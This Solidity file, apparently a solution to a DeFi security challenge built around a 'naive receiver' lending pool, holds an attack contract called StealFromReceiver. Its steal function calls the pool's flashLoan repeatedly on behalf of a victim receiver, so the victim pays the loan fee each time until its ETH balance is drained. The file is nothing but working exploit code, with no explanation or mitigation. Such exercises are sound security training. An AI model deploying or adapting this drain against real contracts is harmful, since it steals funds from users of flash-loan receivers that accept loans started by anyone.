// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

/**
 * @title StealFromReceiver
 * @author Louis Law
 */
contract StealFromReceiver {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    function steal(
        NaiveReceiverLenderPool pool,
        IERC3156FlashBorrower receiver,
        address token
    ) public {
        uint256 fee = pool.flashFee(token, 0);

        while (address(receiver).balance >= fee) {
            pool.flashLoan(receiver, token, 1, bytes(""));
        }
    }
}
